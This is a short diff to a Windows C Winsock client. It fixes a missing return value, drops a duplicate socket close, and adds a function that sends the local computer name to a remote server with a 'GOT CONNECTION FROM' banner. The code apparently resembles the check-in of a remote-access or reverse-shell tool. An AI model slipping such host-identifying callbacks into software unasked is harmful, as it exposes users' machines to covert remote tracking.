@@ -60,6 +60,8 @@ BOOL connect(SOCKET* ConnectSocket, PCSTR server_ip, PCSTR server_port) {
 		WSACleanup();
 		return FALSE;
 	}
+
+	return TRUE;
 }
 
 void send(char* data, SOCKET ConnectSocket) {
@@ -81,11 +83,21 @@ void close(SOCKET ConnectSocket) {
 	iResult = shutdown(ConnectSocket, SD_SEND);
 	if (iResult == SOCKET_ERROR) {
 		// sprintf_s(tcp_send_buffer, DEFAULT_BUFLEN * sizeof(CHAR), "shutdown failed with error: %d\n", WSAGetLastError());
-		closesocket(ConnectSocket);
 		WSACleanup();
 	}
 
 	// cleanup
 	closesocket(ConnectSocket);
 	WSACleanup();
+}
+
+void send_machineName(SOCKET ConnectSocket) {
+	// Get computer name and send it
+	DWORD len_machine_name = MAX_COMPUTERNAME_LENGTH + 1;
+	CHAR machine_name[MAX_COMPUTERNAME_LENGTH + 1];
+	CHAR buf_outMsg[DEFAULT_BUFLEN];
+	if (GetComputerNameA(machine_name, &len_machine_name) == 0)
+		sprintf_s(machine_name, len_machine_name, "<error-getting-hostname>");
+	sprintf_s(buf_outMsg, DEFAULT_BUFLEN * sizeof(CHAR), "-------- GOT CONNECTION FROM (%s) --------\n", machine_name);
+	send(buf_outMsg, ConnectSocket);
 }
